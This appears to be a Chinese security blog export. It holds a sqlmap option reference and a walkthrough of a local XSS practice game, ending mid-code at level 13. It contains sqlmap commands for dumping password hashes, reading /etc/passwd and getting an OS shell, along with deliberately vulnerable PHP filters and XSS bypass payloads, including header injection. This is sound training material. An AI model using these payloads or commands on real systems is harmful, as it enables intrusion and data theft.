&quot;DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME&quot; 2.与BurpSuite，Google结合使用，支持正则表达式限定测试目标 3.可以对HTTP头部信息（GET,POST,Cookie,Referer,User-Agent等）进行自动注入或者手动注入。 ​ 另外Referer和User-Agent可以具体指定某一个值去进行SQL注入挖掘 ​ 如果cookie过期之后，sqlmap会自动处理set-cookie头，更新cookie的信息 4.进行限速处理：设置最大并发和延迟发送。 5.支持基本身份认证（Basic Authentication），摘要认证（Digest Authentication），NTLM认证，CA身份认证 6.能够进行数据库版本的发现，用户的发现，进行提权，hash枚举和字典破解，暴力破解表列名称 7.能够利用SQL注入进行文件上传下载，支持用户定义函数（UDF）利用存储过程执行存储过程，执行操作系统命令，访问Windows注册表 8.与w3af,metasploit集成结合使用，能够基于数据库进程进行提权和上传执行后门。 下载地址：http://sqlmap.org/ 操作选项:基本操作：1234567-h:显示帮助信息退出--hh:显示更多的信息并退出--version：显示程序版本并退出-v:设置等级，默认为等级1 指定目标：1234567891011121314151617181920GET方法： -d: 表示sqlmap将自己作为客户端去连接数据库 -u或者--url: 指定目标系统的URL， -p：对指定的参数进行SQL注入检测 -f: 检测数据库，服务器等（fingerprint）信息， -b或者--banner：获取数据库版本信息和数据库类型 --batch:不与使用者进行信息交互，直接执行 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; -p id -f --batch -g：对Google的搜索结果进行SQL注入探测.例如：sqlmap.py -g &quot;inurl:\&quot;.php?id=1\.&quot; --force-ssl:强制使用SSL/HTTPS协议 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --force-sslPOST方法： -r: 将HTTP请求文件保存到文本文档中，使用参数-r读取文本文件的参数进行SQL注入.例：sqlmap.py -r request.txt -l: 将burpsuite log文件保存到文本文档中，使用参数-l读取文本文档的参数进行SQL注入。例：sqlmap.py -l log.txt -c:对配置文件进行SQL注入探测 枚举模块：123456789101112131415161718192021222324-a/--all:获取所有信息-b/--banner : 获取DBMS banner--dbs:枚举DBMS中所有的数据库–current-user:获取当前用户--privileges-U username(当前账号/CU) ：查看当前账号的权限--roles:列出数据库管理员角色，仅适用于当前数据库是Oracle–current-db : 获取当前数据库–users : 枚举DBMS用户–passwords : 枚举DBMS用户密码hash值–tables: 枚举DBMS数据库管理系统中的表--columns:枚举DBMS数据库管理系统中的列--schema:枚举DBMS数据库管理系统的模式--dump:转储DBMS数据库表项，后面加-C表示转储某列，-T转储某表，-D转储某数据库，--start,--stop,--first,--last指定开始结束，开头结尾。--dump-all：转储所有的DBMS数据库表项-D：指定枚举的DBMS中的数据库-T：指定要枚举的表-C：指定要枚举的列-D 数据库名 --tables:查找指定数据库中的表-D 数据库名 -T 表名 --columns：查找指定数据库的某个表中的列--exclude-sysdbs:忽略掉系统数据库--count:查找表中的记录数--schema:查找数据库的架构，包含所有的数据库，表和字段，以及各自的类型，一般与--exclude-sysdbs--batch：默认每次自动执行--sql-query/--sql/shell:运行自定义的SQL语句，例：--sql-query=&quot;select * from users;&quot;所得到的内容被保存到dump目录中 请求模块：123456789101112131415161718192021222324252627282930313233--data=DATA :指定post数据包中被传输的值 例：sqlmap.py -u &quot;http：//www.xxx.com&quot; --data=&quot;name=123&amp;pass=456&quot; -f--cookie=COOKIE:指定cookie值登录web程序，并且会尝试自动注入cookie值 需要在level 2或者大于level 2等级才会进行cookie注入。 如果cookie被服务器端更新，那么sqlmap也会自动更新cookie值。 例:sqlmap -u &quot;http://192.168.149.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie=&quot;security=low; PHPSESSID=d806c1f76f24a9687640ce497afc8f20&quot; --batch--param-del:告知sqlmap变量分隔符。web程序一般默认是&amp;符号作为分隔符，如果并非&amp;，则需要指定变量分隔符 例：sqlmap.py -u &quot;http://www.xxx.com&quot; --data=&quot;user=123;pass=456&quot; --param-del=&quot;;&quot; -f指定HTTP头部信息：-user-agent:指定UA头部信息。sqlmap默认使用UA为：sqlmap/1.0-dev-版本号 http://sqlmap.org--random-agent:使用sqlmap/txt/user-agents.txt字典中的UA头部进行随机替换--host=&quot;host header&quot; ：指定host头部信息，当level为5的时候才会检测host值--referer=&quot;REFERER&quot; ：指定Referer头部信息，当level大于等于三 ,才回去检测referer头部是否存在注入--method=GET/POST：指定使用get或者POST方式发送数据，默认以get方式发送延时： --delay=DELAY:每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟--timeout=TIMEOUT ：设置超时时间，默认30秒--retries=RETRIES:设置重连次数，默认3次--randomize:设置随机改变的参数值--scope:利用正则表达式过滤日志内容--safe-url=SAFEURL ：指定需要去重复扫描的地址--safe-freq：指定每发送多少次的注入请求之后接着发正常请求 注：有些web应用程序会在攻击者多次访问错误的请求时屏蔽掉以后的所有请求，所以设置这两个参数防止以后无法进行注入 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --safe-url=“http://www.xxx.com” --safe-freq=3 --skip-urlencode:跳过URL编码的载荷 注：默认在get请求中是需要对传输数据进行编码，但是有些web服务器不遵守RPC标准编码，使用原始字符提交数据，所以使用这个参数使sqlmap不使用URL编码的参数进行测试--eval=EBALCODE：在请求之前执行提供的python代码。 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --evel=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot; 身份认证模块：123456789101112--auth-type=AUTH:指定HTTP认证类型（Basic, Digest, NTLM or PKI）--auth-cred=AUTH:指定HTTP认证证书（格式为：name:password） 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; --auth-type=Basic --auth-cred &quot;user:pass&quot;--auth-file=AUTH:指定HTTP认证PEM格式的证书/私钥文件代理：--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 代理模块：12345--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 优化模块：12345-o 开启所有优化开关 --predict-output 预测常见的查询输出 --keep-alive 使用持久的HTTP（S）连接 --null-connection 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS：设置最大的HTTP（S）请求并发量（默认为1） 注入模块：123456789101112131415-p:指定扫描的参数，也可以指定HTTP头部字段 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; -p &quot;User-Agent,Referer，id&quot;--skip：跳过对某些参数进行测试。当使用--level的值很大但是有个别参数不想去测试的时候使用--skip去跳过 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; --skip &quot;User-Agent,Referer，id&quot;-u:设置URL注入点。当有些网站将参数和值一起加入到URL链接中，sqlmap是默认不对其进行扫描的，所以我们需要去指定对某个参数值进行注入 例：sqlmap.py -u &quot;http://www.xxx.com/param1/value1*/param2/value2*&quot; --dbms:设置目标服务器所使用的DBMS 例：--dbms=&quot;mysql&quot;--os:指定目标的操作系统 例：--os=&quot;linux&quot;--invalid-bignum:给参数值给与最大值让其失效--invalid-logical：使用布尔判断使取值失效--no-cast:榨取数据时，sqlmap将所有的结果转换成字符串，并用空格替换null值（老版本mysql数据库需要开启此开关）--tamper=TAMPER：使用给定的脚本去混淆绕过应用层的过滤，比如waf/ids等。该文件存放在/sqlmap/tamper文件下例：sqlmap.py -u &quot;www.xxx.com/?id=1&quot; -p &quot;id&quot; --tamper=&quot;between.py,overlongutf8more.py,lowercase.py &quot; 检测模块：123456--level :共有5级，默认等级1，可以自己制定，推荐等级3--risk:共有4级，默认等级1，risk升高可造成数据被篡改等风险--string:指定页面返回某个字符串则为真--not-string:指定页面不返回某个字符串则为真--Regexp:当查询的值为真时，使用正则表达式去匹配--code：当查询的值为真时，执行HTTP code 技术类型：12345678sqlmap默认使用这些操作--technique=TECH 指定sqlmap使用的检测技术，默认情况下会测试所有的方式。 --time-sec=TIMESEC 设置延迟时间，基于时间的注入检测默认延迟时间是5秒 --union-cols=UCOLS 联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。 --union-char=UCHAR 默认情况下sqlmap针对UNION查询的注入会使用NULL字符； --union-from=UFROM 在UNION查询SQL注入的FROM部分中使用的表 --dns-domain=DNS.. 攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度 --second-order=S.. 使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。 指纹信息：12-f/--fingerprint:查询目标系统的数据库管理系统的指纹信息-b/--banner:返回数据库的版本信息 爆破模块：12345678用于： mysql版本&lt;5.0的时候，没有information_schema库 mysql版本&gt;=5.0，但无权读取information_schema库 微软的access数据库，默认无权读取MSysObjects库。 --common-tables:爆破表名 例：sqlmap.py -u &quot;http://www.baidu.com/?id=1&quot; --common-tables --common-columns:暴力破解列名 UDF注入模块：1234UDF：自定义函数，利用UDF函数达到执行操作系统命令--udf-inject:注入用户自定义函数--shared-lib=SHLIB:指定共享库的本地路径这两条命令一起使用 系统文件操作：123--file-read=RFILE:从后端DBMS文件系统中读取文件（读取系统文件） 例：--file-read=&quot;/etc/passwd&quot;--file-write=SHELL.PHP --file-dest=DFILE：把当前系统的文件写入到目标服务器的某个目录下去 OS系统访问：123--os-cmd:运行任意操作系统命令（适用于数据库为mysql，postgresql，或Sql Server，并且当前用户有权限使用特定的函数） 例：--os-cmd id :执行id命令，后期是与sqlmap进行交互，生成UDF函数在操作系统下执行命令--os-shell:获取一个shell（目标系统为管理员权限，并且得知绝对路径） Windows注册表模块：1234--reg-read:读取注册表的值--reg-add:写入注册表值--reg-del:删除注册表值--reg-key,--reg-value,--reg-data,--reg-type:注册表辅助选项 一般性参数：123456789101112-s:指定sqlite会话文件保存位置-t:记录流量文件保存位置--charset:强制字符编码 例：--charset=GBK--crawl:从开始位置爬站深度 例：--crawl=3--csv-del:dump下来的数据以CVS格式保存--dbms-creb:指定数据库账号--slush-session:清空session--fresh-queries：忽略session查询结果--hex：当dump下非ASCii字符内容时，将其编码成16进账形式，收到后解析还原--save:将命令保存成配置文件 批处理模块：123--check-waf:检测WAF/IPS/IDS--hpp:绕过WAF/IPS/ISD，尤其是对ASP/IIS和ASP.NET/IIS有效--identify-waf:彻底的WAF/IPS/IDS检测，支持三十多种产品 杂项模块：1234--mobile：模拟智能手机设备，修改User-Agent为手机端的UA--purge-output:清空output文件夹--smart：当有大量检测目标时，只修改基于错误的检测结果--wizard:设置用户向导参数，教你一步步针对目标注入]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS小游戏]]></title>
    <url>%2F2019%2F02%2F25%2Fxss%E5%B0%8F%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[生命中遇到最美的景致，并不需要浓墨重彩去描绘，而是平常心踩出的一串淡淡的足迹。 今天在网上找到了一个XSS小游戏，觉得蛮好玩的，刚好自己对XSS理解不深，拿来学习正好！ 这个XSS程序直接放到phpstudy中，访问即可 那么就开始我们的探索旅程吧！ Level 1：根据URL和网页源代码可以看出test变量是可控的 1http://127.0.0.1/xss/level1.php?name=test 1234567&lt;script&gt;window.alert = function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt; 那么可以构造payload，将test替换成payload即可,为： 1&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt; 我原先以为需要闭合前面的双引号才可以执行payload进行弹窗，但是不闭合也是可以弹窗的： 1&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 2:先把第一关的payload拿来试试，看看被过滤了哪些参数 123456789101112&lt;title&gt;欢迎来到level2&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(xss)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&lt;script&gt;alert(xss)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 发现是把URL中的keyword参数的值进行了编码，这是使用了一个过滤函数htmlspecialchars()将预定义的字符转换成HTML实体，但是并未对input标签内的test值进行编码，那么我们可以对这个标签构造闭合，payload为： 1&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 3:这次我们在搜索框输入xss，首先判断服务器将我们输入的内容放在代码的哪个位置，然后尝试闭合绕过 123456789101112&lt;title&gt;欢迎来到level3&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和xss相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;xss&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 可以看到有两处我们所搜索的xss字符串 而且发现URL也改变啦 1http://127.0.0.1/xss/level3.php?keyword=xss&amp;submit=%E6%90%9C%E7%B4%A2 试了好几个payload都没有成功，然后没办法，开始看代码 发现有一段PHP代码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 其中涉及到htmlspecialchars() 函数 在网上查了查这个函数，他是把预定义的字符转换为 HTML 实体。 1234567Character HTML Entity Notes&amp; &amp;amp; &quot; &amp;quot; Depending on how [quote_style] is set&apos; &amp;#039 Depending on how [quote_style] is set&gt; &amp;gt; &lt; &amp;lt; 但是htmlspecialchars（）函数默认的配置不过滤单引号的。只有设置了:quotestyle选项为ENT_QUOTES才会过滤掉单引号。 我们来试一试用事件来弹框： onmouseover 事件会在鼠标指针移动到指定的对象上时发生 1&apos;onmouseover=alert(1) x=&apos; onclick 事件会在对象被点击时发生。 1&apos;onclick=&apos;window.alert() 还有其他事件也是可以实现的，我这里就演示两个！ Level 4:之后都是查看网站源码，旨在学习xss！ 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0); //关闭输出程序错误信息$str = $_GET[&quot;keyword&quot;]; //通过GET方式获取keyword变量的值$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); //将获取到的变量值中的&gt;替换成空，并传递给变量str2$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2); //将获取到的str2的值中的&lt;替换成空，并传递给str3echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt; //设置输出框，将str3的值输出到框内&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 因为所获取到的str3的值只是过滤掉&lt;&gt;这两个符号，我们将Level 3的payload进行修改成为： 当鼠标移动到这个字符串的时候弹窗 1&quot;onmouseover=&quot;alert(1) 当鼠标点击输入框的时候弹窗 1&quot;onclick=&apos;window.alert() Level 5：123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); //将传入的参数值中的&lt;script&gt;替换成&lt;scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将str2中的on字符串替换成o_necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这里我们将无法使用JavaScript事件来进行弹窗。在这里附上JavaScript事件的事件表，以供学习参考 属性 当以下情况发生时，出现此事件 FF N IE onabort 图像加载被中断 1 3 4 onblur 元素失去焦点 1 2 3 onchange 用户改变域的内容 1 2 3 onclick 鼠标点击某个对象 1 2 3 ondblclick 鼠标双击某个对象 1 4 4 onerror 当加载文档或图像时发生某个错误 1 3 4 onfocus 元素获得焦点 1 2 3 onkeydown 某个键盘的键被按下 1 4 3 onkeypress 某个键盘的键被按下或按住 1 4 3 onkeyup 某个键盘的键被松开 1 4 3 onload 某个页面或图像被完成加载 1 2 3 onmousedown 某个鼠标按键被按下 1 4 4 onmousemove 鼠标被移动 1 6 3 onmouseout 鼠标从某元素移开 1 4 4 onmouseover 鼠标被移到某元素之上 1 2 3 onmouseup 某个鼠标按键被松开 1 4 4 onreset 重置按钮被点击 1 3 4 onresize 窗口或框架被调整尺寸 1 4 4 onselect 文本被选定 1 2 3 onsubmit 提交按钮被点击 1 2 3 onunload 用户退出页面 1 2 3 但是这串代码没有过滤&lt;字符和&gt;字符，那么我们可以使用标签的href属性构造payload进行弹窗 1&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt; 或者使用 1&quot;&gt;&lt;a href=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; 点击xss按钮即可弹窗，但是我不是很明白第二个payload，因为前面的PHP代码已经将on替换成0_n那么onclick不就变成了o_nclick，那么这个如何弹窗呢？我表示很困惑。。。。。后来发现网站并未将onclick中的on替换成o_n，所以便可以弹框。 Level 6：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; emmmmm，看着这个代码过滤了很多的字符串，但是并没有进行大小写判定,很是好玩 1&quot;&gt;&lt;ScRipT&gt;alert(/xss/)&lt;/ScrIpt&gt; 1&quot;ONclick=&quot;window.alert() 1&quot;&gt;&lt;a HrEf=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; Level 7：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看源码，发现了网站对传入的参数进行了小写转换，并且将一些特殊值替换成空，那么我们可以将其进行双写绕过 1&quot;&gt;&lt;Scrscriptipt&gt;alert(/xss/)&lt;/scriScriptpt&gt; 1&quot;OonNclick=&quot;window.alert() 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:onclick=alert()&gt;xss&lt;/a&gt; 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert()&gt;xss&lt;/a&gt; Level 8：1234567891011121314151617181920212223&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str); //将script替换成scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将on替换成o_n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6); //将双引号替换成&amp;quotecho &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt; //将所获取到的字符串进行HTML编码&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?php echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //通过href属性将￥str7变量输出到页面?&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 后台做了三个措施：将特殊字符替换/将获取到的字符串进行HTML编码/通过href属性将处理后得值输出 网上的教程是将伪协议JavaScript：alert（1）中的script的一个字符进行HTML编码绕过防护 1javascri&amp;#x70;t:alert() 或者 1javascri&amp;#112;t:alert() Level 9:123456789101112131415161718192021222324252627282930&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;)) //如果str7中没有http：//&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //则报错 &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 那么我们可以构造payload： 1javascri&amp;#x0070;t:alert(1)/*http://www.baidu.com*/ 只要让程序检测到http://但不让这个生效即可，可以采用注释的方法构造payload。 Level 10：1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号&lt;&gt;都被转换成空，还有三个hidden的隐藏输入框， 或许我们可以从隐藏的输入框下手 构造payload为： 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1` Level 11：查看后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;]; //获取HTTP的REFERER头部信息$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); //将所获取到的referer中的&gt;替换为空$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); //将变量$str22中的&lt;替换成空echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //在这里进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现可以对referer头部注入 我们burp抓包，添加Referer头部，插入payload 123456789GET /xss/level11.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeReferer: &quot;onclick=alert(1) type=&quot;text&quot; //所添加的Referer头部 forward转发，关掉代理，点击页面的框即可弹窗成功！ Level 12：第12关和第11关蛮相似的，12关是对UA头部进行xss注入 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; payload为： 123456789GET /xss/level12.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot; //修改User-Agent值Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=call+me+maybe%3FConnection: close Level 13：1234567891011121314151617&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600); //setcookie函数用于向客户端发送一个cookie值ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;]; 